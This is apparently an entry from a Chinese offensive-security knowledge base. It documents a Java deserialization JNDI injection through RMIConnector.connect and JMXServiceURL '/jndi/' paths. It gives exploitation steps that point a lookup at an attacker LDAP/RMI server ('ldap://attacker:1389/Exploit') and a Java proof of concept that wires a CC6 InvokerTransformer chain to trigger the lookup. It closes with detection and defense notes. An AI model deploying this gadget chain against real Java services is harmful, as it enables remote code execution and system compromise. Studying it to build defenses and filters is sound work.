---
id: web-java-deser-rmiconnector-jndi-findrmiserverjndi
title: RMIConnector.connect 的 JNDI 分支：JMXServiceURL urlPath 以 /jndi/ 开头触发 findRMIServerJNDI → InitialContext.lookup
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: rmiconnector-connect-jndi-findrmiserverjndi
aliases:
- RMIConnector JNDI 注入
- findRMIServerJNDI
- /jndi/ JMXServiceURL
- RMIConnector.connect lookup
- JMX JNDI 注入
tags:
- java
- deserialization
- jndi
- rmiconnector
- jmx
- gadget
- lookup
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V473
  verified_at: '2026-11-10T16:59:59+08:00'
  notes: 已对照原文13668图10-15核对：findRMIServer按/jndi//stub//ior/前缀分派、findRMIServerJNDI用new InitialContext(env).lookup(jndiURL)、经RMIConnector.connect(Map)触发均与原文一致；/jndi/与既有/stub/二次反序列化卡为不同分支不同sink；原文该分支无成功截图，confidence medium适当；PoC未本机执行
---

## 一句话结论

`RMIConnector.connect()` 会按 `JMXServiceURL` 的 `urlPath` 前缀分派：当路径以 `/jndi/` 开头时，`findRMIServerJNDI` 用 `new InitialContext(env).lookup(jndiURL)` 直接发起 JNDI 查询；因此只要能用任意方法调用 gadget（如 CC6 的 `InvokerTransformer`）触发一个 `RMIConnector.connect()`，并把 `urlPath` 设为 `/jndi/ldap://attacker/...`，就能在不依赖 `/stub/` 二次反序列化的情况下完成 JNDI 注入。

## 原理

- **分派点**：`RMIConnector.findRMIServer(JMXServiceURL directoryURL, Map environment)` 先取 `directoryURL.getURLPath()`，截到第一个 `;`；然后按前缀分派：
  - `/jndi/` → `findRMIServerJNDI(path.substring(6), env, isIiop)`
  - `/stub/` → `findRMIServerJRMP`（Base64 解码后 `readObject`，二次反序列化）
  - `/ior/` → `findRMIServerIIOP`
- **findRMIServerJNDI**：`InitialContext ctx = new InitialContext(EnvHelp.mapToHashtable(env)); Object objref = ctx.lookup(jndiURL); ctx.close();` 若 `isIiop` 走 `narrowIIOPServer`，否则 `narrowJRMPServer`。`jndiURL` 完全来自 `urlPath`，因此攻击者可指向恶意 LDAP/RMI 服务。
- **怎么到达 connect**：`RMIConnector.connect()` 是 public 无参方法；在反序列化链里用 `InvokerTransformer("connect", null, null)`（或 Rhino1 的 `MemberBox.invoke`）对构造好的 `RMIConnector` 调用即可。`RMIConnector(JMXServiceURL, Map)` 构造器把 stub 设为 null，`connect()` 于是走 `findRMIServer`。
- **与 /stub/ 的区别**：`/stub/` 是把 Base64 序列化数据交给 JDK 自己的 `ObjectInputStream` 反序列化；`/jndi/` 是让 RMIConnector 主动 `lookup` 攻击者控制的 JNDI 服务，利用面从"二次反序列化"换成"JNDI 远程类加载/本地工厂"，在 `/stub/` 被防护或目标 JDK 对反序列化有额外过滤时是替代路径。
- **JMXServiceURL 构造**：用 `new JMXServiceURL("service:jmx:rmi://")` 后反射改写 `urlPath` 字段（非 final），设为 `/jndi/` + JNDI URL；`protocol` 解析为 rmi，不触发 IIOP 分支。
- **为什么可行**：RMIConnector 是 JDK 自带的 JMX 客户端实现，默认信任 `JMXServiceURL` 中携带的路径；`connect()` 为了兼容 JMX 的 JNDI 定位方式保留了 `lookup` 能力，且没有对目标 URL 做协议/主机白名单。

## 触发条件

- 目标反序列化入口可控，且 classpath 保留 `javax.management.remote.rmi.RMIConnector`（JDK management 模块未裁剪）。
- 存在能调用 `RMIConnector.connect()` 的 gadget（CC6 的 `InvokerTransformer`、Rhino1 的 `MemberBox.invoke`、自研反射 readObject 等）。
- 攻击者可搭建 LDAP/RMI 服务；目标 JDK 未完全禁用远程类加载时可直接加载恶意类，高版本可用本地工厂/`javaSerializedData` 等绕过。
- `JMXServiceURL` 的 `urlPath` 可反射改写（默认非 final）。

## 利用步骤

1. 构造 `JMXServiceURL("service:jmx:rmi://")`，反射把 `urlPath` 设为 `/jndi/ldap://attacker:1389/Exploit`（或 rmi://）。
2. 用该 URL 与 `null` environment 构造 `RMIConnector`。
3. 用 CC6/InvokerTransformer 或 Rhino1 链对 `RMIConnector` 调用无参 `connect()`。
4. `findRMIServer` 命中 `/jndi/` 分支 → `InitialContext.lookup` 请求攻击者 LDAP/RMI 服务。
5. LDAP/RMI 服务返回恶意 Reference（远程 codebase 或 `javaSerializedData` 本地工厂），目标加载/反序列化后执行命令。
6. 记录请求与响应，确认 JNDI 出网与类加载路径。

## PoC

```java
String path = "rmi://127.0.0.1:8085/OLtKoxXc"; // 恶意 JNDI 服务
JMXServiceURL url = new JMXServiceURL("service:jmx:rmi://");
RMIConnector connector = new RMIConnector(url, null);
Field f = JMXServiceURL.class.getDeclaredField("urlPath");
f.setAccessible(true);
f.set(url, "/jndi/" + path); // 关键：/jndi/ 前缀

// 用 CC6 或 Rhino1 链对 connector 调用 connect()
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(connector),
    new InvokerTransformer("connect", null, null)
};
// ... LazyMap/TiedMapEntry/HashMap 外层，反序列化触发 connect()
```

原文给出了该 CC6 版本 payload，但未展示该分支的成功 shell 截图；本卡未在本机复跑。

## 变体与关联

- 变体：`/stub/` 分支的二次反序列化，见 [[web-java-deser-readobject-reflection-rmiconnector-secondary]]、[[web-java-deser-serialkiller-blacklist-cc7-invoker-rmiconnector-secondary]]。
- 变体：用 Rhino1 的 `MemberBox.invoke` 调 `connect()`，见 [[web-java-deser-rhino1-nativeerror-tostring-memberbox-invoke]]。
- 关联：[[web-java-deser-jndi-ldapattribute-getattributedefinition-sink]]（另一条 JNDI sink）、[[web-java-deserialization-jndi-druid-datasource-factory-h2-init]]（JNDI 本地工厂利用）。
- 边界：高版本 JDK 关闭 trustURLCodebase 后需配合本地工厂/`javaSerializedData`；JEP290 全局过滤器会拦截反序列化入口；management 模块裁剪/类黑名单（javax.management）会使链失效。

## 检测与防御

- 检测：序列化流中出现 `javax.management.remote.rmi.RMIConnector` + `JMXServiceURL`；`urlPath` 含 `/jndi/`、`/stub/`、`/ior/`；目标进程向外部 LDAP/RMI 端口发起连接。
- 防御：把 `javax.management` 加入反序列化黑名单；JEP290 全局过滤器；升级 JDK 并保持 trustURLCodebase=false；限制 JMX/JNDI 出网；对 `JMXServiceURL` 路径做前缀白名单。
- 边界：JMX 客户端功能本身合法，检测需结合可控反序列化入口与出网行为。
